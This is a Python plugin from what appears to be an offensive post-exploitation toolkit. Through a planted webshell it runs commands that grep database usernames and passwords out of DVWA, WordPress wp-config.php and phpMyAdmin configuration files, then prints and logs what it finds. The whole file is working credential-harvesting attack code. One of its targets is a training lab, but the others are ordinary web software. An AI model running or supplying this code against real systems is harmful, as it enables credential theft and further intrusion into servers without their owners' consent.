"""Post-ex: harvest database credentials from common config files."""
@register_plugin("DB creds grab", phase="postex", priority=3, attck="T1552.001",
                 desc="DVWA/wp-config/phpMyAdmin config files")
def postex_dbcreds(akazza, shell_url, param):
    GREEN, YELLOW, RESET = col["GREEN"], col["YELLOW"], col["RESET"]
    cmds = [("DVWA config", "cat /var/www/dvwa/config/config.inc.php 2>/dev/null | grep -iE 'db_user|db_password'"),
            ("wp-config", "find /var/www -name wp-config.php 2>/dev/null | head -1 | xargs grep -hE 'DB_USER|DB_PASSWORD' 2>/dev/null"),
            ("phpMyAdmin", "cat /etc/phpmyadmin/config.inc.php 2>/dev/null | grep -iE 'user|passw' | head -3")]
    found = False
    for title, cmd in cmds:
        out = akazza.webshell_cmd(shell_url, param, cmd)
        if out.strip():
            print(f"\n{GREEN}[★] {title}:{RESET}")
            for line in out.strip().splitlines()[:6]:
                print(f"    {line}")
            akazza.session_log["postex_findings"].append(f"DB creds ({title}): {out.strip()[:180]}")
            found = True
    if not found:
        print(f"{YELLOW}(nothing found){RESET}")

